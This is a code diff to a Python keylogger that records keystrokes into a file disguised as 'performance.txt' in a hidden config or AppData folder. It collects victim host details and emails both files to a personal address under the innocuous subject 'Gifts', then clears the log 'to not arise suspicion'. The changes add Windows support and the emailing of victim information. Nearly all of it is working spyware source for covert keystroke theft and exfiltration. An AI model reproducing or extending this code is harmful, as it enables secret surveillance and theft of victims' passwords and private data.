@@ -64,7 +64,7 @@ def writeKey(keys: List[Key]) -> None:
             if k.find("Key") == -1: # Check if it is a special key
                 keyFile.write(k)
         fileSize = os.path.getsize(FILEPATH) # Check the size of the file and when it gets to a certain size send email
-        # print(fileSize)
+        print(fileSize)
         if (fileSize % 1000 == 0): # Check size to send email and wipe the current text file to not arise suspiscion
             clear()
 
@@ -74,6 +74,8 @@ def victimInfo() -> None:
     and add it to a text file
     """
     global FILEPATH
+    if (searchFile(FILEPATH.replace("performance.txt", ""), "info.txt") is not None): # Check if we already got the info of this victim
+        return;
     filePath: str = FILEPATH.replace("performance.txt", "info.txt")
 
     with open(filePath, "w") as infoFile:
@@ -89,6 +91,7 @@ def victimInfo() -> None:
         infoFile.write("Machine: " + platform.machine() + "\n")
         infoFile.write("Hostname: " + hostname + "\n")
         infoFile.write("Private IP: " + privateIP)
+    sendEmail(filePath)
 
 def makePath():
     global HOMEPATH
@@ -97,7 +100,7 @@ def makePath():
     if os.name == "posix": # We are on a Linux or Mac sytem
         HOMEPATH = "/home/"  # Set Home Path that is usual for Mac and Linux
         try:
-            username = os.getlogin() + "/" # We will try to get their username
+            username: str = os.getlogin() + "/" # We will try to get their username
             FILEPATH = searchFile(HOMEPATH + username, ".config") + "/performance.txt" # We will look for .config folder or could store in the tmp folder instead
             if FILEPATH is None: # .config was not found then we will make one
                 try:
@@ -108,8 +111,18 @@ def makePath():
         except Exception:
             sys.exit(1)
     elif os.name == "nt":
-        HOMEPATH = "\\C:\\"
-        print("Windows Machine")
+        HOMEPATH = "\\C:\\" # Set home path that is usual for Windows systems
+        try:
+            username: str = os.getlogin() + "\\" # We will attempt to get the username for the home directory
+            FILEPATH = searchFile(HOMEPATH + username + "AppData") + "\\Local\\performance.txt" # We are looking for the App Data folder to store our info
+            if FILEPATH is None: # App Data folder was not found so we will create it
+                try:
+                    os.makedirs(HOMEPATH + username + "AppData")
+                    FILEPATH = HOMEPATH + username + "AppData\\Local\\performance.txt" # Set file path to the directory in Local
+                except OSError:
+                    sys.exit(1)
+        except Exception:
+            sys.exit(1)
         sys.exit(1)
 
 def searchFile(start: str, target: str) -> Union[str, None]:
@@ -122,7 +135,7 @@ def searchFile(start: str, target: str) -> Union[str, None]:
             return os.path.join(root, target)
     return None
 
-def sendEmail() -> None:
+def sendEmail(filePath: str) -> None:
     """
     Send email with current text in the keylogger file
     """
@@ -135,7 +148,7 @@ def sendEmail() -> None:
     # Email Content
     sender: str = "kevincisneros29@gmail.com"
     recipient: str = "kevincisneros29@duck.com"
-    subject: str = "New Keys"
+    subject: str = "Gifts"
     body: str = ""
 
     # Create a multipart message
@@ -148,11 +161,11 @@ def sendEmail() -> None:
     message.attach(MIMEText(body, 'plain'))
     
     # Attach the file
-    attachment = open(FILEPATH, 'rb')
+    attachment = open(filePath, 'rb')
     part = MIMEBase('application', 'octet-stream')
     part.set_payload(attachment.read())
     encoders.encode_base64(part)
-    part.add_header('Content-Disposition', f'attachment; filename={FILEPATH}')
+    part.add_header('Content-Disposition', f'attachment; filename={filePath}')
     message.attach(part)
 
     try:
@@ -177,7 +190,7 @@ def clear():
     Function sends the text file as an email to personal email
     and then clears out the current keys in the text file to not arise suspicion
     """
-    sendEmail()
+    sendEmail(FILEPATH)
     with open(FILEPATH, "w") as keyFile:
         keyFile.truncate(0)
 
